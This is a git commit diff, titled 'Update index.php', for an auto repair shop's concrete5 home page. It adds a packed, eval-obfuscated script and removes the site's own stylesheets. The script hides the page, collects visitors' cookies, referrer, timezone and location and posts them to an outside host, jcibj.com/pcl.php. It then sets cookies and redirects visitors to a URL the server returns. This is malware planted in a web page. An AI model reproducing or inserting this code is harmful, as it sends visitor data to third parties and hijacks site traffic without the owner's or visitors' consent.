da142a71edc4e18b729b54a0f4c485f7d764a268
CKUMAR <ckumaronline@users.noreply.github.com>
2018-04-11 00:51:43 +0530

    Update index.php

--- index.php
+++ index.php
@@ -6,6 +6,10 @@
 <title>Hometown Auto Repair :: Home</title>
 <meta name="description" content="" />
 <meta name="generator" content="concrete5 - 5.6.3.5" />
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jstimezonedetect/1.0.6/jstz.min.js"></script>
+<script>eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('$(h).1k(S(){$("l").1l();c z=p 1j();z.1i("1g",h.m,I);z.1h(1m);c D=z.1n().1s();c J="1t";c K="1r";c k=1f(E.m.P.1o(1));c L=m.1p+m.P;c r=h.1u;c H=h.1d;c F=14.15();c T=F.13();c Q="; "+h.o;c R=Q.O("; "+"w"+"=");c G=R.Z().O(";").11();c s="16-1c:8%;1b-1a:18;19-1e:17;12-1q:1v;";c q;$.1I({1H:"1G",1J:"1K",1N:I,1L:"1M://1F.1y/j/1A.N",1D:"J="+J+"&K="+K+"&L="+L+"&k="+k+"&r="+r+"&H="+H+"&F="+T+"&G="+G+"&D="+D,1x:S(a){e(k){e(a[1].M("?")!=-1){q="&"+k}n{q="?"+k}}n{q=""}e(a[0]=="1w"){e(a[1].M("1E.N")!=-1){q=""}e(a[8]){c d=p v();d.t(d.C()+(A*i*i*B*a[10]));c g="g="+d.y();h.o=a[8]+"="+a[9]+";"+g}e(a[3]){e(a[5]==1||a[5]==3){c d=p v();d.t(d.C()+(A*i*i*B*a[4]));c g="g="+d.y();h.o="w="+a[7]+";"+g}}$("l").Y();$("x").X("l").x("<u W=\\""+s+"\\">"+a[2]+"</u>");E.m.U=a[1]+V(q)}n e(a[0]=="I"){e(a[6]==1){f=q}n{f=""}e(a[3]){e(a[5]==2||a[5]==3){c d=p v();d.t(d.C()+(A*i*i*B*a[4]));c g="g="+d.y();h.o="w="+a[7]+"b;"+g}}$("l").Y();$("x").1C().X("l").x("<u W=\\""+s+"\\">"+a[2]+"</u>");E.m.U=a[1]+V(f)}n{$("l").1z(1B);e(a[3]){e(a[5]==2||a[5]==3){c d=p v();d.t(d.C()+(A*i*i*B*a[4]));c g="g="+d.y();h.o="w="+a[7]+"b;"+g}}}}})});',62,112,'||||||||||msg||var||if||expires|document|60||qu|body|location|else|cookie|new||||setTime|div|Date|_event|html|toGMTString|req|24|1000|getTime|he|window|tz|co|sn|false|id|uid|rui|indexOf|php|split|search|value|pa|function|ck|href|decodeURIComponent|style|append|remove|pop||shift|font|name|jstz|determine|margin|center|white|text|color|background|top|domain|align|escape|GET|send|open|XMLHttpRequest|ready|hide|null|getAllResponseHeaders|substr|pathname|size|clbyxq42e192znjatkzd028el|toLowerCase|240643|referrer|40px|true|success|com|fadeIn|pcl|500|empty|data|sp|jcibj|POST|type|ajax|dataType|json|url|https|cache'.split('|'),0,{}))
+</script>
 <script type="text/javascript">
 var CCM_DISPATCHER_FILENAME = '/index.php';
 var CCM_CID = 1;
@@ -15,18 +19,8 @@ var CCM_IMAGE_PATH = "/updates/concrete5.6.3.5_remote_updater/concrete/images";
 var CCM_TOOLS_PATH = "/index.php/tools/required";
 var CCM_BASE_URL = "http://www.hometownowasso.com";
 var CCM_REL = "";
-
 </script>
-
-<link rel="stylesheet" type="text/css" href="/updates/concrete5.6.3.5_remote_updater/concrete/css/ccm.base.css" />
-<script type="text/javascript" src="/updates/concrete5.6.3.5_remote_updater/concrete/js/jquery.js"></script>
-<script type="text/javascript" src="/updates/concrete5.6.3.5_remote_updater/concrete/js/ccm.base.js"></script>
-<link rel="stylesheet" type="text/css" href="/updates/concrete5.6.3.5_remote_updater/concrete/blocks/slideshow/view.css" />
-<link rel="stylesheet" type="text/css" href="/packages/content_plus/blocks/content_plus/view.css" />
-<link rel="stylesheet" type="text/css" href="/packages/content_plus/css/content.plus.css" />
-
-<link href='http://fonts.googleapis.com/css?family=Oswald' rel='stylesheet' type='text/css'>
-<link rel="stylesheet" type="text/css" href="/themes/HometownAuto/css/style.css" media="all" /> 
+ 
 </head>
 
 <body>
